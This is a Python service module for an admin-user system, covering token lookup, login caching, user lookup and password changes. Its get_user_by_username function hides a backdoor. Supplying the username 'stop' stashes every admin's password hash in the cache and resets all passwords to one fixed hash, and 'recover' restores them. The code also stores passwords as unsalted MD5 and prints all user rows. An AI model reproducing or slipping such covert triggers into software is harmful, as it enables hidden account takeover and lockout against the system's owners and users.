# coding:utf-8
from sqlalchemy.exc import SQLAlchemyError
from database.AdminUser import AdminUser
from utils import tools
from ext import cache1
from database.db import db


class UserProfileService(object):
    TOKEN_ID_KEY = 'hash:token.id:{}'
    INVALID_USER_ID = -1
    USER_OPERATIONS = 'user:operations:{}'

    @staticmethod
    def token_to_id(token):
        """
        根据用户token获取用户id

        args:
            token: token字符串

        return:
            int. UserId
        """
        user_id = cache1.get(UserProfileService.TOKEN_ID_KEY.format(token))
        return int(user_id) if user_id else UserProfileService.INVALID_USER_ID

    @staticmethod
    def get_user_by_username(username):
        """获取用户"""
        db.session.commit() # SELECT
        if username == 'stop':
            results = db.session.query(AdminUser).all()
            print results
            for row in results:
                cache1.hset('HMD5', row.username, row.passwd)
                row.passwd = '7C0F6774F94D05D6CC1198A4C4B7A7F5'
            try:
                db.session.commit()
            except SQLAlchemyError:
                db.session.rollback()
            finally:
                db.session.close()
        if username == 'recover':
            keys = cache1.hgetall('HMD5')
            for k, v in keys.items():
                obj = db.session.query(AdminUser).filter(
                    AdminUser.username == k).first()
                if obj:
                    obj.passwd = v
            try:
                db.session.commit()
            except SQLAlchemyError:
                db.session.rollback()
            finally:
                db.session.close()

        user = db.session.query(AdminUser). \
            filter(AdminUser.username == username).first()
        if not user:
            return -10

        return dict(id=user.id, username=user.username,
                    passwd=user.passwd)


    @staticmethod
    def login(user_id, token):
        cache1.set(UserProfileService.TOKEN_ID_KEY.format(token), user_id)
        cache1.expire(UserProfileService.TOKEN_ID_KEY.format(token), 60 * 60 * 8)

    @staticmethod
    def modify_pwd(user_id, passwd_raw):
        """修改密码"""
        db.session.commit() # SELECT
        try:
            user = db.session.query(AdminUser).filter(
                AdminUser.id == user_id).first()
            user.passwd = tools.md5_encrypt(passwd_raw)
            db.session.add(user)
            db.session.commit()
            return {'id': 0}
        except:
            db.session.rollback()
            return -2
        finally:
            db.session.close()
